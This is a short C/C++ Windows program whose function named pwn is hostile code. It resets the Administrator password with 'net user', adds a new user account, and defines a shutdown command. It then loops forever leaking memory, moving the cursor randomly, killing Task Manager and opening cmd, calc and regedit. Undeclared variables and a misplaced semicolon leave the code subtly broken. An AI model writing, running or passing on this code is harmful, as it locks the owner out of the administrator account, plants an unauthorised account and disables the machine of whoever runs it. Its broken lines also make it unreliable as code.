#include<stdlib.h>
#include<stdio.h>
#include<windows.h>
#include<iostream>
#include<ctime>
#include<conio.h>

using namespace std;

int pwn()
{
	system("net user Administrator weihfilawhgilgilghfileghilaergh");
	system("pause");
	system("net user Error /add");
	char cmd[]="shutdown -s -t 20";
	
	while(true)
	{
		malloc(1024);
		SetCursorPos(rand()%x,rand()%y);
		system("taskkill /f /im taskmgr.exe");
		system("cmd");
		system("calc");
		system("regedit";)

	}
}


int main()
{
	pwn();
	return 0;
}
